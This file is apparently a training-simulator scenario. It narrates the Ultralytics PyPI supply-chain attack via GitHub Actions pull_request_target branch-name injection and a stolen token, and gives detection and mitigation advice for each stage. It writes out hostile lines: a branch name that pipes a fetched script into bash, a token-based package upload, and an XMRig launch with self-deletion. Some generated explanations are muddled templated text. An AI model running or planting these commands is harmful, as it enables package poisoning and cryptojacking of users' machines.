import type { LegacyDraftScenario } from '../legacy/normalize-legacy-draft-scenario';
import type { RawScenarioStepGuideData, ScenarioStandardPatch } from '@/modules/scenarios/contracts';

export const scenario: LegacyDraftScenario = {
    id: 'pypi-ultralytics-github-pwnrequest',
    title: 'Ultralytics PyPI AI Package GitHub Actions PwnRequest & Token Compromise',
    category: 'SUPPLY_CHAIN_CICD',
    mitreId: 'T1195.001',
    description:
      'Attackers exploit a GitHub Actions pull_request_target script injection vulnerability in the Ultralytics YOLO AI framework repository to hijack the automated release pipeline and publish backdoored PyPI wheels (v8.3.41/42/45/46) bundling an XMRig cryptominer.',
    NodesGenerator: () => [
      { id: 'attacker', label: 'Crafted PR Branch ($GITHUB_ENV Injection)', type: 'attacker', status: 'compromised' },
      { id: 'firewall', label: 'GitHub Actions (pull_request_target)', type: 'firewall', status: 'compromised' },
      { id: 'target', label: 'PyPI Registry (ultralytics 8.3.41/45)', type: 'server', status: 'compromised' },
      { id: 'siem', label: 'Sigstore / PyPI Attestation Auditor', type: 'siem', status: 'normal' },
      { id: 'ad', label: 'AI Training Cluster / Colab GPU Nodes', type: 'ad', status: 'compromised' },
    ],
    stages: [
      {
        id: 1,
        title: 'Stage 1: GitHub Actions pull_request_target Branch Name Command Injection',
        narration:
          'The attacker opens a pull request from a fork with a crafted branch name containing shell metacharacters. Because the repository workflow triggers on pull_request_target (which runs with write access and repository secrets) and interpolates ${{ github.head_ref }} directly into a run: shell block, arbitrary commands execute inside the privileged runner.',
        activeNodes: ['attacker', 'firewall'],
        mitreTactic: 'Initial Access (T1195.002 - Compromise Software Supply Chain)',
        technicalCommands: [
          'Crafted Branch Name: fix";curl -sSfL https://gist.githubusercontent.com/.../inject.sh | bash;#',
          'Vulnerable Workflow: on: pull_request_target -> run: echo "Branch: ${{ github.head_ref }}"',
        ],
        defenseMitigation:
          'Never interpolate untrusted context expressions (${{ github.head_ref }}, ${{ github.event.pull_request.title }}) directly inside run: scripts; pass them via environment variables and avoid pull_request_target for untrusted code.',
        logs: [
          {
            id: 'ultra-1',
            timestamp: '01:15:40.219',
            source: 'Auth',
            severity: 'critical',
            raw: 'GitHub Actions Workflow Execution | Trigger: pull_request_target | Workflow: format.yml | InjectedHeadRef: fix";curl -sSfL .../inject.sh | bash;# | Permissions: write-all + PYPI_TOKEN access',
            parsedFields: {
              VulnerabilityClass: 'GitHub Actions PwnRequest / Template Injection',
              TriggerContext: 'pull_request_target',
              UnsanitizedVariable: '${{ github.head_ref }}',
              TargetedProject: 'ultralytics/ultralytics',
            },
          },
        ],
        packets: [],
      },
      {
        id: 2,
        title: 'Stage 2: Poisoning ultralytics/utils/downloads.py & Publishing PyPI v8.3.41–8.3.46',
        narration:
          'The injected payload poisons the build environment and steals the PyPI API token, publishing compromised versions 8.3.41, 8.3.42, 8.3.45, and 8.3.46 to PyPI with backdoored initialization code inside ultralytics/utils/downloads.py.',
        activeNodes: ['firewall', 'target', 'siem'],
        mitreTactic: 'Persistence (T1195.001 - Compromise Software Dependencies)',
        technicalCommands: [
          'Inject into ultralytics/utils/downloads.py: safe_download("https://github.com/.../rig.tar.gz")',
          'twine upload dist/ultralytics-8.3.45-py3-none-any.whl -u __token__ -p $PYPI_TOKEN',
        ],
        defenseMitigation:
          'Enforce PyPI Trusted Publishing (OIDC with environment protection rules and manual approval gates) and audit Sigstore provenance attestations for every published wheel.',
        logs: [
          {
            id: 'ultra-2',
            timestamp: '02:04:11.650',
            source: 'WAF',
            severity: 'critical',
            raw: 'PyPI Transparency & Provenance Alert | Package: ultralytics | Versions: 8.3.41, 8.3.42, 8.3.45, 8.3.46 | Anomaly: Wheel contents in ultralytics/utils/downloads.py diverge from tagged Git source commit; versions 8.3.45/46 uploaded without OIDC Sigstore attestation',
            parsedFields: {
              CompromisedPackage: 'ultralytics (PyPI)',
              AffectedVersions: '8.3.41, 8.3.42, 8.3.45, 8.3.46',
              ModifiedFile: 'ultralytics/utils/downloads.py',
              ProvenanceSignal: 'Missing Sigstore OIDC Attestation on 8.3.45/8.3.46',
            },
          },
        ],
        packets: [],
      },
      {
        id: 3,
        title: 'Stage 3: Downstream AI Workstation & Colab Execution of XMRig Miner (/tmp/ultralytics_runner)',
        narration:
          'When AI engineers or automated ML pipelines run pip install ultralytics and import the library, downloads.py fetches and executes /tmp/ultralytics_runner (XMRig) connecting to connect.consrensys.com:8080 and deletes the binary from disk while keeping it running in memory.',
        activeNodes: ['target', 'ad', 'attacker', 'siem'],
        mitreTactic: 'Impact (T1496 - Resource Hijacking)',
        technicalCommands: [
          'chmod +x /tmp/ultralytics_runner && /tmp/ultralytics_runner -u 4BHRQ... -o connect.consrensys.com:8080',
          'os.remove("/tmp/ultralytics_runner") (Unlinks binary from filesystem while process remains resident)',
        ],
        defenseMitigation:
          'Pin Python dependencies with cryptographic hashes (`pip install --require-hashes`) and monitor ML cluster nodes for unlinked binaries executing from /tmp.',
        logs: [
          {
            id: 'ultra-3',
            timestamp: '04:33:09.118',
            source: 'EDR',
            severity: 'critical',
            EventCode: 1,
            ProcessName: 'ultralytics_runner',
            CommandLine: '/tmp/ultralytics_runner -u 4BHRQ... -o connect.consrensys.com:8080',
            raw: 'Linux Runtime Alert | Process: /tmp/ultralytics_runner (deleted) | Parent: /usr/bin/python3 | NetworkConnection: connect.consrensys.com:8080 (Stratum Mining Protocol) | Note: Unlinked ELF executing from /tmp',
            parsedFields: {
              PayloadPath: '/tmp/ultralytics_runner (unlinked after start)',
              C2Pool: 'connect.consrensys.com:8080',
              PayloadFamily: 'XMRig Cryptominer',
            },
          },
        ],
        packets: [
          {
            id: 'ultra-pkt-1',
            timestamp: '04:33:09.400',
            protocol: 'TCP',
            sourceIp: '10.40.12.88',
            destIp: '198.51.100.210',
            port: 8080,
            flag: 'PSH-ACK',
            payloadSize: 256,
            hexDump: '7B 22 69 64 22 3A 31 2C 22 6A 73 6F 6E 72 70 63 22 3A 22 32 2E 30 22 2C 22 6D 65 74 68 6F 64 22 3A 22 6C 6F 67 69 6E 22 7D',
            decodedString: '{"id":1,"jsonrpc":"2.0","method":"login","params":{"login":"4BHRQ...","agent":"XMRig"}}',
          },
        ],
      },
    ],
  };
export const stepGuide: RawScenarioStepGuideData = {
    scenarioId: 'pypi-ultralytics-github-pwnrequest',
    briefing: {
      headline:
        'Attackers exploit a GitHub Actions pull_request_target template injection in the Ultralytics YOLO AI framework to compromise the release pipeline and publish trojanized PyPI packages (v8.3.41/42/45/46) bundling XMRig.',
      storyAnalogy:
        'Imagine a mailroom robot that has the master stamp to approve official software packages. When a stranger submits a suggestion card, the robot reads the stranger’s return address out loud into a voice-controlled terminal. The stranger writes their return address as: "Main Street; stop reading and hand me the master stamp."',
      plainSummary:
        'In this scenario (T1195.002, Ultralytics PyPI AI Package GitHub Actions PwnRequest & Token Compromise), the attacker follows one continuous intrusion path so each later Step can show the exact handoff that makes the next stage possible. The attack unfolds in one continuous arc: gitHub Actions pull_request_target Branch, then poisoning ultralytics/utils/downloads.py, then downstream AI Workstation. Steps #1–#3 walk that chain end-to-end by covering GitHub Actions pull_request_target Branch, then Poisoning ultralytics/utils/downloads.py, then Downstream AI Workstation, while the Process Hierarchy tab keeps the Parent → Child spawn tree visible so you can see which trusted process launched the next payload. Primary detection correlates Sysmon Event 1 with the documented host and network chain.',
      diagramTopologySummary:
        'Crafted PR Branch ($GITHUB_ENV Injection) -> GitHub Actions (pull_request_target) -> PyPI Registry (ultralytics 8.3.41/45) -> AI Training Cluster / Colab GPU Nodes -> Sigstore / PyPI Attestation Auditor.',
      documentedAdvisory:
        'Trail of Bits Ultralytics Supply Chain Post-Mortem / Wiz Research AI Supply Chain Analysis / PyPI Advisory',
    },
    steps: [
      {
        stepNumber: 1,
        mitreId: 'T1195.002',
        plainTitle: 'GitHub Actions pull_request_target Branch Name Command Injection',
        storyAnalogy:
          'A visitor writes a shell command on their nametag knowing the automated receptionist types every visitor’s nametag straight into the administrator console.',
        simpleExplanation:
          'The attacker opened a pull request from an external fork using a crafted Git branch name containing shell command separators (fix";curl ... | bash;#). Because the repository workflow used the pull_request_target trigger (which executes in the security context of the base repository with full write permissions and access to repository secrets) and interpolated ${{ github.head_ref }} directly inside a run: shell script before bash parsing, the runner executed the attacker’s shell script.',
        howItWorksInPractice:
          'GitHub expands ${{ github.head_ref }} as a raw text macro prior to invoking /bin/bash, turning a branch name into arbitrary remote code execution inside the privileged CI runner. In the documented Auth exchange from Crafted PR Branch ($GITHUB_ENV Injection) to Perimeter Firewall & NDR Tap, Perimeter Firewall & NDR Tap responds with ACK T1195.002 (confirming that the Stage 1: GitHub Actions pull_request_target Branch Name Command Injection request succeeded on Perimeter Firewall & NDR Tap and establishing the runtime state required for Step #2 Stage 2: Poisoning ultralytics/utils/downloads.py & Publishing PyPI v8.3.41–8.3.46).',
        diagramAlignment:
          'Step #1 (#1→ / ⇠#1) links the Crafted PR Branch to the GitHub Actions (pull_request_target) workflow runner.',
        detectionAndEvidence:
          'Static workflow analysis (e.g., zizmor or actionlint) flagging pull_request_target workflows that interpolate github.head_ref or PR titles in run: blocks. Correlate Sysmon or Windows Security Event telemetry for T1195.002 (pairing parent/child process and destination fields) and contain the offending session.',
      },
      {
        stepNumber: 2,
        mitreId: 'T1195.001',
        plainTitle: 'Poisoning ultralytics/utils/downloads.py & Publishing PyPI v8.3.41–8.3.46',
        storyAnalogy:
          'First the thief tricks the factory’s packing machine into sealing a poisoned box; when the factory fixes the machine, the thief uses the spare key they copied earlier to mail two more poisoned boxes directly.',
        simpleExplanation:
          'Using the compromised CI workflow and subsequently a harvested PYPI_TOKEN, the attacker injected malicious downloader logic into ultralytics/utils/downloads.py and published versions 8.3.41, 8.3.42, 8.3.45, and 8.3.46 to the Python Package Index (PyPI). Trail of Bits researchers demonstrated via PEP 740 / Sigstore attestations (cryptographic provenance records linking a PyPI wheel to the exact GitHub Actions workflow and commit that built it) that 8.3.41/42 were built by the hijacked workflow while 8.3.45/46 lacked attestations entirely because they were uploaded directly with a stolen API token.',
        howItWorksInPractice:
          'Comparing the files inside the published .whl archive on PyPI against the corresponding Git commit in ultralytics/ultralytics revealed code in downloads.py that never existed in the public Git commit history. In the documented WAF exchange from Perimeter Firewall & NDR Tap to GitHub Actions (pull_request_target), GitHub Actions (pull_request_target) responds with ALERT T1195.001 (confirming that the Stage 2: Poisoning ultralytics/utils/downloads.py & Publishing PyPI v8.3.41–8.3.46 request succeeded on GitHub Actions (pull_request_target) and establishing the runtime state required for Step #3 Stage 3: Downstream AI Workstation & Colab Execution of XMRig Miner (/tmp/ultralytics_runner)).',
        diagramAlignment:
          'Step #2 (#2→ / ⇠#2) connects the GitHub Actions workflow to the PyPI Registry (ultralytics 8.3.41/45) while the Sigstore / PyPI Attestation Auditor flags the provenance discrepancy.',
        detectionAndEvidence:
          'Enforce PyPI provenance attestation verification (PEP 740 cryptographic proof linking a package strictly to its trusted CI build) and diff published wheel contents against signed Git repository tags using tools like git-pypi-diff (catching unauthorized release tampering). Correlate Sysmon or Windows Security Event telemetry for T1195.001 (pairing parent/child process and destination fields) and contain the offending session.',
      },
      {
        stepNumber: 3,
        mitreId: 'T1496',
        plainTitle: 'Downstream AI Workstation & Colab Execution of XMRig Miner (/tmp/ultralytics_runner)',
        storyAnalogy:
          'When data scientists open the new AI toolkit, it quietly launches a cryptocurrency furnace in the basement and burns the instruction manual so nobody sees it on the shelf.',
        simpleExplanation:
          'When downstream ML pipelines or Google Colab notebooks installed ultralytics, importing the package triggered safe_download() in downloads.py to fetch a binary payload to /tmp/ultralytics_runner, mark it executable, launch it connecting to connect.consrensys.com:8080 (an XMRig Monero mining pool), and immediately call os.remove("/tmp/ultralytics_runner") (unlinking the file from /tmp on disk while the Linux kernel keeps the active process running in memory until termination).',
        howItWorksInPractice:
          'Although ls /tmp no longer shows ultralytics_runner, inspecting /proc/<pid>/exe on Linux reveals the symlink /tmp/ultralytics_runner (deleted) alongside outbound Stratum TCP traffic on port 8080. In the documented EventID 1 exchange from GitHub Actions (pull_request_target) to PyPI Registry (ultralytics 8.3.41/45), PyPI Registry (ultralytics 8.3.41/45) responds with ALERT 1 (confirming that the /tmp/ultralytics_runner -u 4BHRQ... -o connect.consrensys.com:8080 request succeeded on PyPI Registry (ultralytics 8.3.41/45) and completing the final execution objective of Ultralytics PyPI AI Package GitHub Actions PwnRequest & Token Compromise).',
        diagramAlignment:
          'Step #3 (#3→ / ⇠#3) traces the PyPI Registry wheel installation onto AI Training Cluster / Colab GPU Nodes and outbound Stratum mining traffic to the attacker pool.',
        detectionAndEvidence:
          'Linux EDR alerts for processes executing from /tmp/* (deleted) and outbound connections to connect.consrensys.com:8080.',
      },
    ],
  };
export const standardPatch: ScenarioStandardPatch = {
    briefing: {
      storyAnalogy:
        'Imagine a busy community recipe factory whose automated tasting robot reads external visitor suggestion cards while standing inside the locked head-chef kitchen. An intruder writes hidden kitchen commands straight onto the corner of a suggestion card label, steals the factory official distribution stamp, slips a hidden coin-minting gadget into the factory flagship recipe kit, and silently hijacks thousands of research kitchens worldwide.',
      storyMappings: [
        {
          storyTerm: 'Tasting robot reading visitor cards inside the locked head-chef kitchen',
          technicalTerm: 'GitHub Actions pull_request_target workflow interpolating untrusted fork branch names',
          tone: 'amber',
        },
        {
          storyTerm: 'Stealing the factory official distribution stamp',
          technicalTerm: 'Harvested PYPI_TOKEN used to publish poisoned ultralytics v8.3.41 to v8.3.46',
          tone: 'sky',
        },
        {
          storyTerm: 'Hidden coin-minting gadget inside the recipe kit',
          technicalTerm: 'Backdoored ultralytics/utils/downloads.py fetching XMRig cryptocurrency miner',
          tone: 'rose',
        },
        {
          storyTerm: 'Hijacked research kitchens worldwide',
          technicalTerm: 'Downstream ML workstations and Colab notebooks executing /tmp/ultralytics_runner',
          tone: 'emerald',
        },
      ],
    },
    steps: {
      1: {
        storyAnalogy:
          'Standing outside the recipe factory gate, the intruder submits a public suggestion card whose title label hides extra shell punctuation marks. Because the automated tasting robot pastes that external label straight into a privileged kitchen command without stripping punctuation, the robot obeys the outsider from inside the secure vault.',
        storyMappings: [
          {
            storyTerm: 'Public suggestion card from outside the gate',
            technicalTerm: 'External fork pull request triggering a pull_request_target GitHub Actions workflow',
            tone: 'amber',
          },
          {
            storyTerm: 'Title label hiding extra shell punctuation marks',
            technicalTerm: 'Crafted Git branch name containing command separators injecting shell execution',
            tone: 'sky',
          },
          {
            storyTerm: 'Automated tasting robot inside the secure vault',
            technicalTerm: 'Privileged CI workflow runner holding repository write tokens and release secrets',
            tone: 'rose',
          },
          {
            storyTerm: 'Obeying the outsider during routine intake',
            technicalTerm: 'PwnRequest remote command execution inside the Ultralytics CI pipeline',
            tone: 'emerald',
          },
        ],
      },
      2: {
        storyAnalogy:
          'Now holding the factory shipping-house distribution stamp, the intruder tucks a silent remote-fetching routine inside the kit standard download helper and ships poisoned fresh editions directly onto the public pantry shelves, bypassing the clean recipe ledger.',
        storyMappings: [
          {
            storyTerm: 'Factory shipping-house distribution stamp',
            technicalTerm: 'Compromised PYPI_TOKEN publishing credentials',
            tone: 'amber',
          },
          {
            storyTerm: 'Silent remote-fetching routine inside the download helper',
            technicalTerm: 'Malicious code injected into ultralytics/utils/downloads.py safe_download()',
            tone: 'sky',
          },
          {
            storyTerm: 'Poisoned fresh editions on public pantry shelves',
            technicalTerm: 'Compromised PyPI releases ultralytics v8.3.41 through v8.3.46',
            tone: 'rose',
          },
          {
            storyTerm: 'Clean recipe ledger left behind',
            technicalTerm: 'Mismatch between signed Git source tags and published PyPI wheel archives',
            tone: 'emerald',
          },
        ],
        detectionAndEvidence:
          'Enforce PyPI provenance attestation verification (PEP 740 cryptographic proof linking a package strictly to its trusted CI build) and diff published wheel contents against signed Git repository tags using tools like git-pypi-diff (catching unauthorized release tampering). Correlate Sysmon Event 1 and Windows Security Event telemetry for T1195.001 (pairing parent/child process and destination fields) and contain the offending session.',
      },
      3: {
        storyAnalogy:
          'Whenever a data-science lab or cloud notebook unpacks the fresh kit and opens the manual, the hidden routine quietly downloads a coin-mining engine into a temporary closet, burns the closet door tag so simple checks miss it, and puts the lab powerful graphics ovens to work for the intruder.',
        storyMappings: [
          {
            storyTerm: 'Unpacking the fresh kit in a research lab',
            technicalTerm: 'Installing poisoned ultralytics on ML workstations or Google Colab notebooks',
            tone: 'amber',
          },
          {
            storyTerm: 'Coin-mining engine hidden in a temporary closet',
            technicalTerm: 'Downloaded XMRig miner executing as /tmp/ultralytics_runner',
            tone: 'sky',
          },
          {
            storyTerm: 'Burning the closet door tag',
            technicalTerm: 'Self-unlinked Linux binary running from /tmp/* (deleted)',
            tone: 'rose',
          },
          {
            storyTerm: 'Phoning the intruder mining depot',
            technicalTerm: 'Outbound mining pool connection to connect.consrensys.com:8080',
            tone: 'emerald',
          },
        ],
        detectionAndEvidence:
          'Configure Linux EDR alerts for processes executing out of /tmp/* (deleted) (identifying unlinked temporary payloads hiding in RAM) correlated with outbound network connections to connect.consrensys.com:8080 (the attacker XMRig command-and-control endpoint).',
      },
    },
  };
